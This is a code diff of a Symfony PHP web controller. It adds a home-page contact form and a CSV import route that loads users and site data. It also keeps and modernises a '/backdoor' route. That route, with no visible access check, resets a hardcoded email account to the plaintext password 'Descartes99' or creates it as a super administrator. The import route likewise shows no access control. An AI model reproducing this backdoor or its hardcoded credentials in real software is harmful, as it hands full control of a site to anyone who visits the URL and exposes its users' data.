@@ -3,35 +3,61 @@
 namespace App\Controller;
 
 use App\Entity\User;
+use App\Entity\WebsiteContacts;
+use App\Form\ImportType;
+use App\Form\WebsiteContactsType;
 use App\Repository\CmsCopyRepository;
 use App\Repository\CmsPhotoRepository;
 use App\Repository\CompanyDetailsRepository;
+use App\Repository\FacebookGroupsRepository;
 use App\Repository\ProductRepository;
 use App\Repository\UserRepository;
 use App\Repository\SubPageRepository;
+use App\Services\ImportBusinessContactsService;
+use App\Services\ImportBusinessTypesService;
+use App\Services\ImportCMSCopyService;
+use App\Services\ImportCmsPageCopyPageFormatService;
+use App\Services\ImportCMSPhotoService;
+use App\Services\ImportCompanyDetailsService;
+use App\Services\ImportCompetitorsService;
+use App\Services\ImportFacebookGroupsService;
+use App\Services\ImportLanguagesService;
+use App\Services\ImportMapIconsService;
+use App\Services\ImportProductsService;
+use App\Services\ImportUsefulLinksService;
+use App\Services\ImportUserService;
 use Doctrine\ORM\EntityManagerInterface;
 use JeroenDesloovere\VCard\VCard;
 use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
+use Symfony\Component\HttpFoundation\File\Exception\FileException;
+use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
 use Symfony\Component\Routing\Annotation\Route;
-use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;
+use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
+use Symfony\Component\String\Slugger\SluggerInterface;
 
 class   HomeController extends AbstractController
 {
     /**
      * @Route("/", name="app_home")
      */
-    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, CompanyDetailsRepository $companyDetailsRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
+    public function index(Request $request, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, CompanyDetailsRepository $companyDetailsRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
     {
         $companyDetails = $companyDetailsRepository->find('1');
         $homePagePhotosOnly = 0;
-        $qrcode=false;
+        $website_contact = new WebsiteContacts();
+        $form = $this->createForm(WebsiteContactsType::class, $website_contact);
+        $form->handleRequest($request);
+        $include_qr_code = [];
+        $include_contact_form = [];
+
+        $qrcode = false;
         if ($companyDetails) {
             $homePagePhotosOnly = $companyDetails->isHomePagePhotosOnly();
-            $qrcode = $companyDetails->isIncludeQRCodeHomePage();
+            $include_qr_code = $companyDetails->isIncludeQRCodeHomePage();
+            $include_contact_form = $companyDetails->isIncludeContactFormHomePage();
         }
-
         $cms_copy = [];
         $cms_photo = [];
         $product = [];
@@ -44,7 +70,6 @@ class   HomeController extends AbstractController
             ['staticPageName' => 'Home'],
             ['ranking' => 'ASC']
         );
-
 
         $cms_copy_ranking1 = $cmsCopyRepository->findOneBy([
             'staticPageName' => 'Home',
@@ -71,7 +96,11 @@ class   HomeController extends AbstractController
 
         if ($homePagePhotosOnly == 1) {
             return $this->render('home/home.html.twig', [
-                'photos' => $cms_photo
+                'photos' => $cms_photo,
+                'cms_copy_array' => $cms_copy,
+                'include_qr_code' => $include_qr_code,
+                'include_contact_form' => $include_contact_form,
+                'form' => $form?->createView(),
             ]);
         } else {
             return $this->render('home/products.html.twig', [
@@ -79,9 +108,10 @@ class   HomeController extends AbstractController
                 'cms_copy_array' => $cms_copy,
                 'cms_photo_array' => $cms_photo,
                 'sub_pages' => $sub_pages,
-                'include_contact' => 'Yes',
-                'include_QR_code' => $qrcode,
-                'format' => $page_layout
+                'include_qr_code' => $include_qr_code,
+                'include_contact_form' => $include_contact_form,
+                'format' => $page_layout,
+                'form' => $form?->createView(),
             ]);
         }
     }
@@ -90,12 +120,12 @@ class   HomeController extends AbstractController
     /**
      * @Route("/backdoor", name="/backdoor")
      */
-    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
+    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordHasherInterface $passwordHasher): Response
     {
         $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
         if ($user) {
             $user->setPassword(
-                $passwordEncoder->encodePassword(
+                $passwordHasher->hashPassword(
                     $user,
                     'Descartes99'
                 )
@@ -108,7 +138,7 @@ class   HomeController extends AbstractController
                 ->setEmail('nurse_stephen@hotmail.com')
                 ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                 ->setPassword(
-                    $passwordEncoder->encodePassword(
+                    $passwordHasher->hashPassword(
                         $user,
                         'Descartes99'
                     )
@@ -182,8 +212,7 @@ class   HomeController extends AbstractController
             $cms_photo = $cmsPhotoRepository->findBy([
                 'product' => $productEntity,
             ],
-                ['ranking' => 'ASC'])
-            ;
+                ['ranking' => 'ASC']);
         } else {
             $cms_photo = $cmsPhotoRepository->findBy([
                 'staticPageName' => $product
@@ -202,8 +231,8 @@ class   HomeController extends AbstractController
             'cms_copy_array' => $cms_copy,
             'cms_photo_array' => $cms_photo,
             'sub_pages' => $sub_pages,
-            'include_contact' => 'No',
-            'include_QR_code' => 'No'
+            'include_contact_form' => 'No',
+            'include_qr_code' => 'No'
         ]);
     }
 
@@ -265,4 +294,51 @@ class   HomeController extends AbstractController
             'qr_code' => $qr_code,
         ]);
     }
+
+    /**
+     * @Route ("/import", name="project_set_up_initial_import" )
+     */
+    public function projectSetUpInitialImport(Request $request, SluggerInterface $slugger, ImportBusinessContactsService $importBusinessContactsService, ImportBusinessTypesService $importBusinessTypesService, ImportCMSCopyService $importCMSCopyService, ImportCMSPhotoService $importCMSPhotoService, ImportCmsPageCopyPageFormatService $importCmsPageCopyPageFormatService, ImportCompanyDetailsService $importCompanyDetailsService, ImportCompetitorsService $importCompetitorsService, ImportFacebookGroupsService $importFacebookGroupsService, ImportLanguagesService $importLanguagesService, ImportMapIconsService $importMapIconsService, ImportProductsService $importProductsService, ImportUsefulLinksService $importUsefulLinksService, ImportUserService $importUserService): Response
+    {
+        $form = $this->createForm(ImportType::class);
+        $form->handleRequest($request);
+        if ($form->isSubmitted() && $form->isValid()) {
+            $importFile = $form->get('File')->getData();
+            if ($importFile) {
+                $originalFilename = pathinfo($importFile->getClientOriginalName(), PATHINFO_FILENAME);
+                $safeFilename = $slugger->slug($originalFilename);
+                $newFilename = $safeFilename . '.' . 'csv';
+                try {
+                    $importFile->move(
+                        $this->getParameter('project_set_up_import_directory'),
+                        $newFilename
+                    );
+                } catch (FileException $e) {
+                    die('Import failed');
+                }
+
+                $importCompanyDetailsService->importCompanyDetails($newFilename);
+                $importBusinessContactsService->importBusinessContacts($newFilename);
+                $importBusinessTypesService->importBusinessTypes($newFilename);
+                $importCMSCopyService->importCMSCopy($newFilename);
+                $importCMSPhotoService->importCMSPhoto($newFilename);
+
+                $importCmsPageCopyPageFormatService->importCmsCopyPageFormats($newFilename);
+                $importCompetitorsService->importCompetitors($newFilename);
+                $importFacebookGroupsService->importFacebookGroups($newFilename);
+                $importLanguagesService->importLanguages($newFilename);
+                $importMapIconsService->importMapIcons($newFilename);
+                $importProductsService->importProducts($newFilename);
+                $importUsefulLinksService->importUsefulLink($newFilename);
+                $importUserService->importUser($newFilename);
+
+                return $this->redirectToRoute('dashboard');
+            }
+        }
+        return $this->render('home/import.html.twig', [
+            'form' => $form->createView(),
+            'heading' => 'Facebook Groups Import',
+        ]);
+    }
+
 }
